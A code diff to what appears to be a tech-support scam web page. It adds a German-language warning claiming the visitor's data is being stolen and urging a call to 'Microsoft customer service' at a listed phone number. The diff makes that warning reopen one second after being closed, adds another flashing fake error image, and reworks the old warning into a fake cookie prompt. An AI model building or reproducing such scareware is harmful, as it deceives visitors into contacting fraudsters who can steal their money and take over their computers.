@@ -2,21 +2,21 @@
 <html lang="en">
 
 <head>
-     <!-- Google tag (gtag.js) -->
+    <!-- Google tag (gtag.js) -->
 
-        <script async src="https://www.googletagmanager.com/gtag/js?id=G-C8HX0FYXSM"></script>
-        <script>
-            window.dataLayer = window.dataLayer || [];
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-C8HX0FYXSM"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
 
-            function gtag() {
-                dataLayer.push(arguments);
-            }
-            gtag('js', new Date());
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
 
-            gtag('config', 'G-C8HX0FYXSM');
-        </script>
+        gtag('config', 'G-C8HX0FYXSM');
+    </script>
 
-        <!-- Google tag (gtag.js) -->
+    <!-- Google tag (gtag.js) -->
 
     <!-- Required meta tags -->
     <meta charset="utf-8">
@@ -231,15 +231,28 @@
     <div class="error_msg2" style="position: absolute; top: 30%; left: 30%; transform: translate(0, -50%); animation: zoomInOut 0.5s infinite alternate; display: none; ">
         <img src="error.png" alt="" width="650px" height="500px" style="border: 1px solid rgb(185, 185, 185);">
     </div>
+    <div class="error_msg3" style="position: absolute; top: 10%; left: 10%; transform: translate(0, -50%); animation: zoomInOut 0.7s infinite alternate; display: none; ">
+        <img src="p1.png" alt="" width="650px" height="500px" style="border: 1px solid rgb(185, 185, 185);">
+    </div>
+
+
 
     <!-- Modal -->
+    <div id="modal2" class="modal-container">
+        <!-- Modal content -->
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal2()">&times;</span>
+            <h2 style="color: rgb(206, 33, 33) !important;">Warning</h2>
+            <p>Ihre Daten werden gestohlen. Um dies zu verhindern, rufen Sie den Microsoft-Kundendienst unter <span style="color: rgb(59, 59, 192) !important; font-weight: 600; font-size:20px ;">+49 74729589695</span> an</p>
+        </div>
+    </div>
 
     <div id="modal" class="modal-container">
         <!-- Modal content -->
-        <div class="modal-content">
+        <div class="modal-content" style="width: 500px; background-color: #e1e1e1;">
             <span class="close-button" onclick="closeModal()">&times;</span>
-            <h2 style="color: red !important;">Warning</h2>
-            <p>Ihre Daten werden gestohlen. Um dies zu verhindern, rufen Sie den Microsoft-Kundendienst unter <span style="color: rgb(59, 59, 192) !important; font-weight: 600; font-size:20px ;">+49 74729589695</span> an</p>
+            <h2 style="color: rgb(0, 0, 0) !important;">Cookies akzeptieren</h2>
+            <p> Diese Seite verwendet Cookies. Lassen Sie Cookies vorerst für die weitere Implementierung zu</p>
         </div>
     </div>
 
@@ -250,16 +263,28 @@
             modal.style.display = 'block';
         }
 
+        function openModal2() {
+            var modal2 = document.getElementById('modal2');
+            modal2.style.display = 'block';
+        }
+
         // Function to close the modal and reopen after 2 seconds
         function closeModal() {
             var modal = document.getElementById('modal');
             modal.style.display = 'none';
-            setTimeout(openModal, 2000); // Reopen modal after 2 seconds
+            // setTimeout(openModal, 2000); // Reopen modal after 2 seconds
+        }
+
+        function closeModal2() {
+            var modal = document.getElementById('modal2');
+            modal2.style.display = 'none';
+            setTimeout(openModal2, 1000); // Reopen modal after 2 seconds
         }
 
         // Function to show modal on page load
         window.onload = function() {
             openModal();
+            openModal2();
         };
     </script>
 
@@ -294,10 +319,12 @@
         function showError() {
             var errorMessage = document.querySelector('.error_msg');
             var errorMessage2 = document.querySelector('.error_msg2');
+            var errorMessage3 = document.querySelector('.error_msg3');
             var navbar = document.querySelector('.navbar');
             var cont = document.querySelector('.cont');
             errorMessage.style.display = 'block';
             errorMessage2.style.display = 'block';
+            errorMessage3.style.display = 'block';
             navbar.style.display = 'block';
             cont.style.display = 'flex';
         }
